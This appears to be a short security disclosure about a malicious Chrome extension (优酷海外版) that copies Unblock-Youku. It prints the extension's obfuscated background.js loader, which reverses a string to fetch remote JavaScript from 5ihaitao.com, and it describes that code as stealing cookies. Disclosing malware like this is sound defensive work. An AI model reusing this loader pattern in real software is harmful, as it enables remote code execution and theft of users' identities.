Name: 优酷海外版

CWS ID: emmoddikhgncnaikamapbkggedoafomi

Homepage: `https://chrome.google.com/webstore/detail/%E4%BC%98%E9%85%B7%E6%B5%B7%E5%A4%96%E7%89%88/emmoddikhgncnaikamapbkggedoafomi/`

This is a malicious copy the extension Unblock-Youku (ID: pdnfnkhpgegpcingjbfihlkjeighnddk).

In its background.js file, you can find

```javascript
function chk() {
    var a = new XMLHttpRequest;
    a.onreadystatechange = function () {
        4 == a.readyState && (localStorage.updated = a.responseText)
    };
    a.open("GET", "sj.gol/gol/moc.oatiahi5.emorhc//:ptth".split("").reverse().join(""), !0);
    a.send(null)
}
```

It will download arbitrary javascript code from their server `5ihaitao.com`, and execute it on your local computers.

The current version of the log.js file is kept a record in this folder.

You can check that the log.js file actually gets and manipulates users' website cookies, which can actually steal your online indentities and leak your private and important information.
